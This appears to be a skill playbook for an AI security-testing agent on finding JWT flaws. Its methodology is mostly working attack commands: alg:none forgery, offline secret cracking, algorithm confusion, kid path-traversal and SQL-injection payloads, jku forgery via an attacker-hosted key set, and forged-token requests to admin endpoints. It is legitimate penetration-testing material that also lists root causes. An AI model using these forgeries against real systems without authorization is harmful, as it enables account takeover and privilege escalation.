---
name: jwt
description: >
  Hunt for JWT attacks: alg=none acceptance, weak/brute-forceable HMAC secrets, kid-header
  injection (path traversal/SQLi via the kid claim), and jku/x5u header injection (pointing
  signature verification at an attacker-controlled key). Use whenever the app uses JWTs for
  session/auth (`Authorization: Bearer`, a JWT-shaped cookie, API tokens).
  Keywords: jwt, json web token, alg none, hs256 to rs256 confusion, weak secret brute force,
  kid injection, jku injection, x5u injection, jwt_tool, hashcat jwt crack, signature bypass.
  Do NOT use for session cookies that are opaque server-side session IDs with no JWT
  structure — that's auth-bypass territory instead. Do NOT use for OAuth flow-level
  issues (redirect_uri, authorization code theft) — use open-redirect/auth-bypass;
  this skill is specifically about the JWT's own cryptographic/structural validation.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-347, CWE-345, CWE-287]
  mitre_attack: [T1552, T1556]
  tools: [jwt_tool, hashcat, john, curl, jwt-cracker]
depends_on: [active-recon, web-crawling, auth-mapping]
feeds_into: [chain-analysis, auth-bypass]
chains_with: [auth-bypass, idor, ssrf]
---

## Signals

- Any token matching the `header.payload.signature` base64url-dot-separated JWT structure,
  especially in `Authorization: Bearer`, cookies, or API response bodies after login.
- Decoded header revealing `"alg": "HS256"` (symmetric — brute-forceable secret, and a target
  for alg-confusion against an RS256-expecting verifier) or containing a `kid`, `jku`, or `x5u`
  field.
- Decoded payload containing authorization-relevant claims (`role`, `isAdmin`, `scope`,
  `user_id`) that, if forgeable, directly grant privilege.
- No visible token expiry enforcement (long-lived tokens, or tokens still accepted well past
  their `exp` claim).
- Library/framework fingerprint suggesting a JWT implementation known for historical alg-
  confusion issues (older jsonwebtoken/pyjwt/jjwt versions).

## Prerequisites

- A captured, valid JWT from an authenticated session.
- For brute-force: the JWT itself (contains everything `hashcat`/`john` need to attempt an
  offline crack — this doesn't touch the live target at all until a candidate secret is found).
- For `jku`/`x5u`: ability to host a JSON Web Key Set or X.509 cert on infra you control.

## Methodology

1. **Decode and inspect the token first** — always, before any attack attempt:
   ```bash
   jwt_tool $TOKEN   # prints decoded header/payload and runs basic checks automatically
   # or manually:
   echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null; echo
   echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null; echo
   ```

2. **`alg: none` acceptance test** — strip the signature entirely and see if the server still
   accepts the token:
   ```bash
   jwt_tool $TOKEN -X a
   # jwt_tool builds the alg:none variant automatically; or manually:
   python3 -c "
   import base64, json
   header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
   payload_b64 = '$TOKEN'.split('.')[1]
   print(header.decode() + '.' + payload_b64 + '.')
   "
   curl -s https://target/api/profile -H "Authorization: Bearer <RESULT_FROM_ABOVE>"
   ```
   A `200` with valid authenticated content = confirmed `alg:none` bypass.

3. **Weak-secret brute force (HS256)** — fully offline, no target interaction required until a
   candidate is confirmed:
   ```bash
   jwt_tool $TOKEN -C -d /usr/share/wordlists/rockyou.txt
   # or
   hashcat -a 0 -m 16500 $TOKEN /usr/share/wordlists/rockyou.txt
   john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt_hash.txt
   ```
   If a secret is found, forge a new token with elevated claims and confirm acceptance:
   ```bash
   jwt_tool $TOKEN -S hs256 -p "found_secret_here" -T
   # jwt_tool prompts to edit claims interactively, then signs with the recovered secret
   curl -s https://target/api/admin/users -H "Authorization: Bearer <FORGED_TOKEN>"
   ```

4. **Algorithm confusion (RS256 → HS256)** — when the server expects RS256 (asymmetric) but
   the verification code passes whatever `alg` the token claims into a generic verify function,
   an attacker who knows the RS256 public key can sign a forged HS256 token using that public
   key as the HMAC secret:
   ```bash
   jwt_tool $TOKEN -X k -pk public_key.pem
   # jwt_tool automates: builds alg=HS256 header, signs payload using the PEM's content as the
   # HMAC key, outputs the forged token
   curl -s https://target/api/admin/users -H "Authorization: Bearer <FORGED_TOKEN>"
   ```
   The public key itself is often obtainable from a `/.well-known/jwks.json` endpoint, a TLS
   cert, or embedded in client-side JS/mobile app binaries — locate it before attempting this.

5. **`kid` header injection** — if the `kid` (key ID) claim is used to look up the verification
   key via a filesystem path or database query, test for path traversal or SQL injection in
   that lookup:
   ```bash
   # path traversal — point kid at a predictable file whose content becomes the HMAC key
   jwt_tool $TOKEN -I -hc kid -hv "../../../../dev/null"
   # a predictable empty/known-content file as "key" lets you sign with that known value

   jwt_tool $TOKEN -I -hc kid -hv "/etc/passwd"
   # if the app reads kid as a raw file path into the key material

   # SQL injection in the kid lookup (if the key is fetched via `SELECT key FROM keys WHERE id=?`)
   jwt_tool $TOKEN -I -hc kid -hv "nonexistent' UNION SELECT 'known_secret' --"
   ```
   Confirm by signing the forged token with the value you expect the injected `kid` lookup to
   resolve to, then testing acceptance.

6. **`jku`/`x5u` header injection** — point the key-set/certificate URL at infra you control,
   serving a JWKS/cert containing a key *you* generated, then sign the token with your own
   matching private key:
   ```bash
   # generate your own RSA keypair
   openssl genrsa -out attacker_key.pem 2048
   openssl rsa -in attacker_key.pem -pubout -out attacker_pub.pem

   jwt_tool $TOKEN -X s -jw attacker_key.pem -ju "https://YOUR_VPS/jwks.json"
   # jwt_tool builds the JWKS file matching attacker_key.pem automatically and tells you
   # where to host it; serve it from YOUR_VPS, then test:
   curl -s https://target/api/admin/users -H "Authorization: Bearer <FORGED_TOKEN>"
   ```
   If the server fetches your `jku` URL and verifies the forged token against your own key, this
   is confirmed and typically critical severity — it's a full signature-bypass primitive.

7. **Claim tampering without touching the signature** (checks whether the server actually
   verifies the signature at all, vs. only decoding it):
   ```bash
   jwt_tool $TOKEN -T
   # edit the role/isAdmin claim interactively, keep the original signature unchanged, submit
   curl -s https://target/api/admin/users -H "Authorization: Bearer <TAMPERED_TOKEN>"
   ```
   Any acceptance here is a severe finding (signature not verified at all) — test this first,
   it's the cheapest check and rules out needing any of the above if it already succeeds.

8. **Expiry/replay check:**
   ```bash
   jwt_tool $TOKEN -X e   # jwt_tool flags expired tokens; test an old captured token directly
   curl -s https://target/api/profile -H "Authorization: Bearer <OLD_EXPIRED_TOKEN>"
   ```

9. **Automated full sweep** once a token is captured — `jwt_tool`'s playbook mode runs most of
   the above systematically:
   ```bash
   jwt_tool $TOKEN -M pb -t https://target/api/profile -rl "Authorization: Bearer "
   ```

## Tooling

- `jwt_tool` — the primary tool for nearly every technique above (decode, tamper, alg-none,
  alg-confusion, kid/jku/x5u injection, automated playbook mode).
- `hashcat`/`john` — offline HS256 secret brute-forcing.
- `openssl` — keypair generation for the jku/x5u forgery technique.
- `curl` — submitting forged tokens against the live target to confirm acceptance.

## Root Causes

- JWT library/verification code accepting the `alg` value from the token itself rather than
  pinning the expected algorithm server-side (`jwt.verify(token, key, { algorithms: ['RS256'] })`
  explicitly, not left to the token to declare).
- Weak, short, dictionary-guessable HMAC secrets for HS256 signing.
- `kid` claim used to directly construct a filesystem path or SQL query without sanitization/
  allowlisting of valid key identifiers.
- `jku`/`x5u` header values trusted and fetched without validating the URL against an allowlist
  of the application's own trusted key-hosting domains.
- Signature verification skipped or bypassed entirely in some code path (e.g., a debug/test
  branch left reachable in production).

## Validation Gate (minimum proof)

- A forged/tampered token (via whichever specific technique) is accepted by the live target,
  with the resulting authenticated response demonstrating the claimed privilege change (e.g.,
  access to an admin endpoint using a token whose `role` claim you set yourself) — both the
  forged token (decoded, for readability) and the server's response captured.
- For secret brute-forcing: the actual recovered secret value and a forged token signed with it
  that the server accepts.
- For jku/x5u: your hosted JWKS/cert content and the server's confirmed fetch (via your own
  access log) plus the accepted forged token.

## Gotchas

- **Minimum proof, not a privilege-escalation spree.** Forge one admin-equivalent token, use it
  for one confirming request; don't use the forged token to make broad changes across the
  target.
- **Common N/A:** `alg` is correctly pinned server-side (confirmed by testing `alg:none` and
  alg-confusion and both being rejected) — legitimate N/A for those specific variants; still
  test the others (weak secret, kid, jku/x5u) independently rather than stopping at the first
  N/A.
- **Common N/A:** `kid`/`jku`/`x5u` headers aren't present in the token at all — those specific
  attack variants simply don't apply; don't force-fit them, move to the applicable techniques.
- **Overclaim trap:** recovering a weak secret via offline brute-force against a token that has
  already expired is good evidence of a weak-secret *configuration* issue, but the *live*
  finding requires forging a fresh, unexpired token and confirming the server accepts it — do
  both steps before reporting full account-takeover severity.
- **Overclaim trap:** successfully tampering with a claim in a token that the server happens to
  never actually read/trust for the specific endpoint you tested (e.g., you changed `role` but
  that endpoint checks a separate server-side permissions table, not the JWT claim) is not
  proof of impact — confirm the *specific* claim you tampered with is actually the one the
  target endpoint relies on for its authorization decision.
- RS256→HS256 confusion requires the RS256 public key to be obtainable — if it's not published
  anywhere reachable (no JWKS endpoint, not embedded in client code), this variant is N/A,
  don't assume you can still pull it off without the key material in hand.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Alg confusion to forgery** — If alg confusion (RS256→HS256) works, can you forge a token with admin/elevated claims?
2. **Weak key signing** — If the signing key was cracked/guessed, can you sign arbitrary claims (any user, any role)?
3. **kid injection** — Does kid header injection achieve SQLi (key-lookup query) or path traversal (key lookup from filesystem)?
4. **Expiration tampering** — Can you extend or remove the expiration claim and have the server still accept the token?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- Any confirmed forgery technique → direct **auth-bypass** / full account-equivalent
  impersonation — report at the severity the forged claim's privilege warrants.
- Forged token with elevated `user_id`/`role` claim → **idor** testing becomes moot since the
  identity itself is forgeable; note this supersedes per-object IDOR findings on the same
  target in terms of overall severity framing.
- `jku`/`x5u` pointing at attacker infra is itself a variant of **ssrf** (the server makes an
  outbound fetch to a URL you control) — note the dual classification if the fetch behavior
  itself (headers sent, internal network reachability) is also worth separately documenting.
